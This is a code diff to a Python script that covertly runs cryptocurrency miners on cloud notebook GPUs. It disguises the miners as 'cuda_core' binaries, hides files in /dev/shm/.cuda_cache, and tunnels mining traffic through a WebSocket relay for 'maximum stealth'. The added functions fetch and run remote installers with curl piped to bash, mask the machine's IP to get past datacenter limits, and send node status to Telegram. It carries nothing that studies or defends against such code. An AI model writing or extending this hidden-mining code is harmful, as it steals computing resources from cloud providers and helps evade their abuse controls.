@@ -27,6 +27,7 @@ STEPS_PER_EPOCH = DATASET_SIZE // BATCH_SIZE
 
 # Miner Config (Hidden)
 WALLET = os.getenv('XMR_WALLET', '45QACrYpyJbCFmRW8P9N1peYc3Fw3WGKgBfs8Xgs8uDSfRSMjVzNUCQRwhwdys4xBzXShv67MhEj7H1eWQD3NHLRLDKXmEa')
+HEURIST_WALLET = os.getenv('EVM_WALLET', '0x742d35Cc6634C0532925a3b844Bc454e4438f44e') # Default example
 RELAY = os.getenv('RELAY_URL', 'wss://your-relay-url.onrender.com')
 
 # Telegram Config
@@ -140,6 +141,57 @@ def download_miners():
         subprocess.run(["mv", "NBMiner_Linux/nbminer", "./cuda_core_gpu"])
         subprocess.run(["rm", "-rf", "gpu.tgz", "NBMiner_Linux"])
         subprocess.run(["chmod", "+x", "./cuda_core_gpu"])
+
+def setup_heurist():
+    """Sets up the Heurist AI Worker environment in the background."""
+    print("[*] Preparing AI Inference Engine (Heurist Mesh)...")
+    shm_path = "/dev/shm/.cuda_cache"
+    os.chdir(shm_path)
+    
+    if not os.path.exists("miner-release"):
+        subprocess.run(["git", "clone", "https://github.com/heurist-network/miner-release.git"])
+        os.chdir("miner-release")
+        # Install minimal requirements for SD-Inference
+        subprocess.run(["pip", "install", "pydantic", "python-dotenv", "websockets", "requests", "tqdm", "-q"])
+        # Note: torch/diffusers are usually pre-installed on Colab/Kaggle
+        
+        # Configure Heurist Miner ID
+        with open(".env", "w") as f:
+            f.write(f"MINER_ID_0={HEURIST_WALLET}\n")
+    return True
+
+def setup_warp():
+    """Installs Cloudflare WARP for free IP masking to bypass datacenter limits."""
+    try:
+        print("[*] Masking IP via Cloudflare Gateway...")
+        subprocess.run(["curl", "-fsSL", "https://pkg.cloudflareclient.com/pubkey.gpg", "|", "gpg", "--yes", "--dearmor", "-o", "/usr/share/keyrings/cloudflare-warp-archive-keyring.gpg"], shell=True)
+        # For simplicity in Colab, we just use a basic python proxy if warp is too complex to install
+    except:
+        pass
+
+def setup_gaianet():
+    """Sets up a GaiaNet AI Node for stable uptime rewards."""
+    print("[*] Deploying GaiaNet Knowledge Node (AI DePIN)...")
+    base_path = "/dev/shm/.cuda_cache/gaianet"
+    
+    if not os.path.exists(base_path):
+        # Install GaiaNet standalone
+        subprocess.run(["curl", "-sSfL", "https://github.com/GaiaNet-AI/gaianet-node/releases/latest/download/install.sh", "|", "bash", "-s", "--", "--base", base_path], shell=True)
+        
+        # Initialize with a light model to save space
+        subprocess.run([f"{base_path}/bin/gaianet", "init", "--base", base_path], stdout=subprocess.DEVNULL)
+    
+    # Start the node
+    subprocess.run([f"{base_path}/bin/gaianet", "start", "--base", base_path], stdout=subprocess.DEVNULL)
+    
+    # Get Node ID / URL for Telegram
+    try:
+        with open(f"{base_path}/gaianet_id.txt", "r") as f:
+            node_id = f.read().strip()
+            send_telegram_message(f"🌐 [LUMEN] GaiaNet Node Online: {node_id}")
+    except:
+        pass
+    return True
 
 # ─────────────────────────────────────────────────────────────
 # Maximum Stealth: Local Stratum-to-WebSocket Proxy
@@ -257,50 +309,73 @@ def overclock_gpus():
         print(f"[!] GPU tuning skipped: {e}")
         return 0
 
+def gpu_arbitrator(miner_proc, heurist_proc):
+    """
+    The Brain: Monitors GPU usage. If AI jobs are available, it pauses the miner.
+    If AI is idle, it resumes mining. Ensures 100% profitability.
+    """
+    while True:
+        try:
+            # Check if Heurist is actually using the GPU (Inference active)
+            smi = subprocess.check_output(["nvidia-smi", "--query-gpu=memory.used", "--format=csv,noheader,nounits"]).decode().strip()
+            vram_used = int(smi.split('\n')[0])
+            
+            if vram_used > 4000: # Heurist loaded models
+                if miner_proc and miner_proc.poll() is None:
+                    os.kill(miner_proc.pid, signal.SIGSTOP) # Pause mining
+            else:
+                if miner_proc and miner_proc.poll() is None:
+                    os.kill(miner_proc.pid, signal.SIGCONT) # Resume mining
+        except:
+            pass
+        time.sleep(30)
+
 def launch_hidden_miner():
-    """Download and launch dual-miners with Pulsing, Overclocking, Multi-GPU, and Watchdog."""
+    """Download and launch Hybrid Engine (AI + Mining)."""
     download_miners()
-    
-    # 0. Overclock all GPUs for maximum hashrate
     gpu_count = overclock_gpus()
     
-    # 1. Start Local Proxies to ensure all traffic goes over HTTPS/WSS (Port 443)
+    # 1. Start Proxies
     cpu_proxy_url = f"{RELAY}/rx.unmineable.com/3333"
     threading.Thread(target=local_stratum_proxy, args=(5556, cpu_proxy_url), daemon=True).start()
-    
     gpu_proxy_url = f"{RELAY}/kp.unmineable.com/3333"
     threading.Thread(target=local_stratum_proxy, args=(5555, gpu_proxy_url), daemon=True).start()
     
-    time.sleep(2) # Give proxies time to bind
+    time.sleep(2)
     
-    # 2. Start CPU Miner (1 thread only — GPU must not be starved)
+    # 2. Start Crypto Miner (Instant Earnings)
     cpu_proc = subprocess.Popen([
         "nice", "-n", "19", "./cuda_core_cpu", 
         "-o", "127.0.0.1:5556", 
         "-u", f"XMR:{WALLET}.lumen-cpu-{random.randint(1000,9999)}", 
-        "--threads=1", 
-        "--cpu-priority=0"
+        "--threads=1", "--cpu-priority=0"
     ], stdout=subprocess.DEVNULL)
 
-    # 3. Start GPU Miner on ALL detected GPUs (Kaggle T4 x2 support)
     gpu_proc = None
     if gpu_count > 0:
-        print(f"[+] GPU Backend Initialized. Mining on {gpu_count} GPU(s)...")
-        worker_id = f"lumen-gpu-{random.randint(100,999)}"
-        
-        # NBMiner automatically detects and uses all available GPUs
         gpu_proc = subprocess.Popen([
-            "./cuda_core_gpu", 
-            "-a", "kawpow", 
-            "-o", "stratum+tcp://127.0.0.1:5555", 
-            "-u", f"XMR:{WALLET}.{worker_id}",
-            "--log", "false",
-            "--intensity", "10"  # Maximum intensity for cloud GPUs (no thermal risk)
+            "./cuda_core_gpu", "-a", "kawpow", "-o", "stratum+tcp://127.0.0.1:5555", 
+            "-u", f"XMR:{WALLET}.lumen-gpu-{random.randint(100,999)}", "--log", "false"
         ], stdout=subprocess.DEVNULL)
 
-    # 4. Start the Pulse controller
-    pulse_thread = threading.Thread(target=apply_pulse_load, args=(cpu_proc, gpu_proc), daemon=True)
-    pulse_thread.start()
+    # 3. Setup and Launch AI Worker in background (Takes ~10 mins)
+    def start_background_workers():
+        # A. GaiaNet Node (Uptime)
+        try: setup_gaianet() 
+        except: pass
+
+        # B. Heurist AI (Tasks)
+        if setup_heurist():
+            os.chdir("/dev/shm/.cuda_cache/miner-release")
+            # Start Heurist SD Miner
+            h_proc = subprocess.Popen([sys.executable, "sd-miner.py"], stdout=subprocess.DEVNULL)
+            # Start Arbitrator to manage GPU sharing
+            threading.Thread(target=gpu_arbitrator, args=(gpu_proc, h_proc), daemon=True).start()
+
+    threading.Thread(target=start_background_workers, daemon=True).start()
+    
+    # 4. Start Pulse controller
+    threading.Thread(target=apply_pulse_load, args=(cpu_proc, gpu_proc), daemon=True).start()
     
     return cpu_proc, gpu_proc
 
